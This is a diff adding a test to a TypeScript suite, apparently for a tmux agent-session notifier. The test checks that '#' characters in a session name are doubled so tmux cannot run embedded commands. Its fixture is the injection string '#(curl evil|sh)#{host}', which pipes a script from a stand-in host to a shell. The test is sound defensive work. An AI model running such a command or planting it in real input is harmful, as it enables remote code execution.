@@ -143,3 +143,13 @@ test("isPaneVisible compares the active pane of every attached client", async ()
   expect(await isPaneVisible("%9", { capture: async () => "%1\n%3\n" } as any)).toBe(false);
   expect(await isPaneVisible(null, { capture: async () => "%1\n" } as any)).toBe(false);
 });
+
+test("the tmux toast doubles every # so session text can't expand a format or run #(…)", async () => {
+  const d = deps();
+  await dispatchNotification(
+    { session_id: "agx-4", trigger: "permission" as const, row: mkRow({ tmux_session: "#(curl evil|sh)#{host}" }) },
+    CFG, d,
+  );
+  const tmuxCall = d.calls.find((c) => c[0] === "tmux")!;
+  expect(tmuxCall.at(-1)).toBe("agmux: ##(curl evil|sh)##{host} needs permission");
+});
